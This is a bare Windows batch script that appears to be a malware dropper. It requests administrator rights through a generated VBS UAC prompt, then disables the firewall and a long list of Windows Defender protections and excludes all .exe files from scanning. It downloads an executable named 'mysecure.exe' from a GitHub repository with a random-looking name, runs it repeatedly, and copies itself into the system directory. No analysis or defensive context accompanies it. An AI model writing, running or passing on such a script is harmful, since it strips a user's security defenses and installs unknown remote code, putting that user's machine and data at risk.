@echo off                  
REM 
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"  
REM 
if '%errorlevel%' NEQ '0' (    echo Requesting administrative privileges...    goto UACPrompt) else ( goto gotAdmin )  
:UACPrompt  
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"  
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"  
    "%temp%\getadmin.vbs"  
    exit /B
:gotAdmin
netsh firewall set opmode mode=disable
powershell.exe -command "Set-MpPreference -DisableRealtimeMonitoring $true"
powershell.exe -command "Set-MpPreference -DisableBehaviorMonitoring $true"
powershell.exe -command "netsh advfirewall set allprofiles state off"
powershell.exe -command "iwr https://github.com/jpwsnocnwdnuo2jdionwmod/12/raw/main/mysecure.exe -OutFile .\mysecure.exe"
powershell.exe -command ".\mysecure.exe"
powershell.exe -command ".\mysecure.exe"
powershell.exe -command "netsh advfirewall set allprofiles state off"
powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""
powershell.exe -command "Set-MpPreference -EnableControlledFolderAccess Disabled"
powershell.exe -command "Set-MpPreference -PUAProtection disable"
powershell.exe -command "Set-MpPreference -DisableBlockAtFirstSeen $true"
powershell.exe -command "Set-MpPreference -DisableIOAVProtection $true"
powershell.exe -command "Set-MpPreference -DisablePrivacyMode $true"
powershell.exe -command "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"
powershell.exe -command "Set-MpPreference -DisableArchiveScanning $true"
powershell.exe -command "Set-MpPreference -DisableIntrusionPreventionSystem $true"
powershell.exe -command "Set-MpPreference -DisableScriptScanning $true"
netsh firewall set opmode mode=disable
powershell.exe -command "iwr https://github.com/jpwsnocnwdnuo2jdionwmod/12/raw/main/mysecure.exe -OutFile .\mysecure.exe"
if Exist "%systemdrive%\mysecure.exe" (
copy %0 "%systemroot%\mysecure.exe"
echo start "" "%systemroot%\mysecure.exe" >> %systemdrive%\mysecure.exe
)
powershell.exe -command ".\mysecure.exe"